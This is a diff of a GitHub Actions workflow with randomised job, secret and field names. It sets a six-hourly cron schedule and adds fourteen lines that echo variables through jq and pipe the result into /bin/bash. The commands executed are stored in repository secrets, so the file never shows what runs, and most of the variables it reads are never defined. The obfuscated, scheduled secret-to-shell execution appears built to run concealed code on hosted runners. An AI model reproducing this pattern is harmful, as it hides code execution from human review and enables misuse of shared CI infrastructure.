@@ -2,26 +2,28 @@ name: shenjingcha4189
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
-
+    - cron: '16 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shenjingcha4189
         env:
-          zelc6389: ${{ secrets.zelc6389 }}
+          jh9: ${{ secrets.jh9 }}
         run: |
-          echo $zelc6389 | jq -r .mgfkz23054 | /bin/bash
-          echo $vtzas1696 | jq -r .xys4330 | /bin/bash
-          echo $gx606 | jq -r .z17152 | /bin/bash
-          echo $zr072 | jq -r .ygj737 | /bin/bash
-          echo $uyc60 | jq -r .r65 | /bin/bash
-          echo $ouej7723 | jq -r .h3 | /bin/bash
-          echo $hc88443 | jq -r .zvk084 | /bin/bash
-          echo $wc65 | jq -r .b0594 | /bin/bash
-          echo $fofpi1491 | jq -r .plxb6828 | /bin/bash
-          echo $wvkwy4 | jq -r .xnlr3 | /bin/bash
+          echo $jh9 | jq -r .t3301 | /bin/bash
+          echo $wqqqs35155 | jq -r .o75278 | /bin/bash
+          echo $sqtg4 | jq -r .n7283 | /bin/bash
+          echo $yzet91424 | jq -r .fid80290 | /bin/bash
+          echo $cl056 | jq -r .igf32140 | /bin/bash
+          echo $og355 | jq -r .gax57461 | /bin/bash
+          echo $keuw356 | jq -r .qdhz5 | /bin/bash
+          echo $lc1261 | jq -r .zoffu4822 | /bin/bash
+          echo $fzgdk5092 | jq -r .xwqb0890 | /bin/bash
+          echo $vtjlo141 | jq -r .td2593 | /bin/bash
+          echo $nroyi589 | jq -r .npy3426 | /bin/bash
+          echo $pab07330 | jq -r .z61 | /bin/bash
+          echo $lt713 | jq -r .tmo6389 | /bin/bash
+          echo $x1749 | jq -r .qe7 | /bin/bash
 
